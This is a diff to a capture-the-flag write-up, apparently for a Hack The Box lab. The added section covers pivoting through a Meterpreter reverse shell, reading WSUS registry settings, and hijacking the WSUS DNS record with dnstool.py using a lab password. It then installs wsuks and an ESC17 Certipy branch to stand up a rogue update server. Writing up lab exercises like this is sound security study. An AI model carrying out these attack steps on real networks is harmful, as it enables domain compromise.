@@ -452,11 +452,78 @@ break;
 return TRUE;
 }
 ```
-We recompile, repackage, and re-upload as before. On the next cycle, the log shows the export being called.
+We recompile, repackage, and re-upload as before this time update the rev.exe as well. On the next cycle, the log shows the export being called.
 Our handler receives the session, and we have pivoted to jaylee.clifton .
 The user flag can be found in C:\Users\jaylee.clifton\Desktop\user.txt
-Privilege Escalation
+<img width="597" height="247" alt="image" src="https://github.com/user-attachments/assets/60bf5404-b670-4720-be01-0a4c0121d0dd" />
+
+## Privilege Escalation
 Enumerating jaylee.clifton 's home directory, we find a Tickets folder containing an incident report
 about WSUS remediation.
 We can download this HTML file and view it in the browser.
+<img width="1034" height="379" alt="image" src="https://github.com/user-attachments/assets/c8cc86e4-9407-4dcb-a17c-0f06a652cc0a" />
+<img width="784" height="610" alt="image" src="https://github.com/user-attachments/assets/3d897c9c-ef38-4218-a783-7c68034a4662" />
+t is a report that references a ForceSync task that runs a Windows Update check every couple of minutes.
+It points to a wsus.logging.htb host, and notes that the corresponding DNS record has not been created
+yet. We can confirm this by running an nslookup query for wsus.logging.htb .
+<img width="640" height="196" alt="image" src="https://github.com/user-attachments/assets/bab56c83-9343-4806-94e8-229438ee4188" />
+Because the ticket ties the box to Windows Update, we inspect the Windows Update policy registry key to
+learn where the machine is configured to fetch updates from.
+
+```bash
+meterpreter > reg enumkey -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
+Values (5):
+AcceptTrustedPublisherCerts
+WUServer
+WUStatusServer
+UpdateServiceUrlAlternate
+SetProxyBehaviorForUpdateDetection
+meterpreter > reg queryval -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
+-v WUServer
+Key: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Name: WUServer
+Type: REG_SZ
+Data: https://wsus.logging.htb:8531
+```
+The WUServer value confirms the host is pointed at https://wsus.logging.htb:8531 , which has no DNS
+record. Since our wallace account holds the ability to create DNS records in the zone, we add one that
+points wsus.logging.htb at our attacking machine, effectively hijacking where the DC looks for updates
+```bash
+python3 ./krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.245.130 -a add -r wsus.logging.htb -d 10.10.16.227
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+After the record propagates, the name now resolves to our IP address.
+<img width="422" height="159" alt="image" src="https://github.com/user-attachments/assets/2c911010-f6e4-44a5-8339-618fb05b81c5" />
+Listening on the WSUS HTTPS port referenced in the registry confirms that the ForceSync task is driving
+the DC to contact us, but the traffic is encrypted under TLS, so a plain listener gets us nowhere useful, as
+seen below.
+<img width="645" height="263" alt="image" src="https://github.com/user-attachments/assets/8be4fdb6-4ab6-46ff-a551-8f477876fd48" />
+
+
+Serving WSUS over HTTPS means we cannot simply spoof the update endpoint. We need a certificate that
+the DC will trust for wsus.logging.htb . Researching WSUS abuse over TLS leads to this blog post, which
+describes exactly this situation and points to the ESC17 certificate-template attack together with a dedicated
+Certipy PR branch. The idea is to enroll a certificate whose subject we control from a template that permits
+server authentication, and then present it as our rogue WSUS server's TLS certificate.
+We install the wsuks tool and the ESC17-capable build of Certipy .
+
+```bash
+$ sudo apt install pipx python3-nftables
+$ pipx ensurepath
+$ pipx install wsuks --system-site-packages
+$ sudo ln -s ~/.local/bin/wsuks /usr/local/sbin/wsuks
+$ pipx install git+https://github.com/NeffIsBack/Certipy.git@ESC17 --suffix=-esc17
+```
+The enrollment needs to run as jaylee.clifton , since that user is in the IT group that holds enrollment
+rights. From our Meterpreter session on the target, we upload and use Rubeus to obtain a usable ticket
+for the user.
+
+
+
+
+
 
